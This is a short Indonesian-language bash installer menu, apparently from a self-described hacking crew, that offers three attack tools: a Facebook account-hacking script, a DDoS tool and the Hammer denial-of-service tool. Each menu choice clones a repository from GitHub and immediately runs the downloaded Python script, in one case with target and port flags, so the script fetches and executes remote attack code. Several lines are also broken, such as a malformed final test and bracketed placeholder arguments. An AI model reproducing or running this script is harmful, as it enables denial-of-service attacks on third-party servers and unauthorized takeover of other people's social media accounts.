
echo "------------------------------" | lolcat
echo "Author:DR49GON Cyber" | lolcat
echo "Team :Security Exploiter Crew" | lolcat
echo "Costumer Service :6289659876732" | lolcat
echo "------------------------------" | lolcat
echo ""
echo ""
echo "WELCOME TO TOOLS INSTALLER V1" | lolcat
echo "Hp kentang dilarang menggunakan tool ini" | lolcat
echo ""
echo ""
echo ">>>1.DARKFB" [√] | lolcat
echo ">>>2.LUCINTA DDOS" [√] | lolcat
echo ">>>3.HAMMER" [√] | lolcat
echo ">>>00.Exit" [√] | lolcat
echo "-------------------------------------" | lolcat
read -p "Masukan kode perintah : " $pil
if [ $pil = "1" ]
then
clear
sleep 1
git clone https://github.com/ToxicCyberTeam/Facebook
cd Facebook
python2 Hack-FB.py
fi

if [ $pil = "2" ]
then
clear
sleep 2
git clone https://github.com/zlucifer/lucita_ddos
cd lucita_ddos
chmod +x pukul.py
python2 pukul.py
fi

if [ $pil = "3" ]
then
clear
sleep 1
git clone https://github.com/cyweb/hammer
cd hammer
chmod +x hammer.py
python hammer.py
python3 hammer.py -s  -p [80] -t [135]
fi

if [ $pil "00" ]
then
clear
sleep 2
echo "Terimakasih telang mengunakan tool ini" | lolcat
exit
fi
